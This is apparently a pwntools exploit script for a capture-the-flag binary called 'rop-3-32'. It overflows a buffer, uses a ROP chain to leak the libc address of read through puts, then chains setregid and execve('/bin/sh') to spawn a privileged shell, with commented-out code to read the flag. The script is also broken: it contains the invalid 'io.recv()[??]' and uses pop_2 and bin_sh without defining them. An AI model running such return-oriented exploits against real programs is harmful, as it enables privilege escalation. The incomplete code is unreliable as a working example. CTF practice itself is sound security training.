from pwn import *
import os

DEBUG = False 
file = "./rop-3-32"
env = {"PATH":"$PATH:."}

elf = ELF(file)
max_len = 0x9c

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *input_func
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

got_read = p32(0x804a00c)
puts = p32(elf.symbols["puts"])
input_func = p32(elf.symbols["input_func"])

payload = flat (
    b"A" * max_len,
    puts,
    input_func,
    got_read
)
io.sendline(payload)

libc_read = u32(io.recv()[??])

elf.libc.address = libc_read - elf.libc.symbols["read"]

setregid = elf.libc.symbols["setregid"]
execve = elf.libc.symbols["execve"]

payload = flat (
    b"A" * max_len,
    setregid,
    pop_2,
    p32(50006),
    p32(50006),
    execve,
    b"A" * 4,
    bin_sh,
    p32(0),
    p32(0),
)
io.sendline(payload)

io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
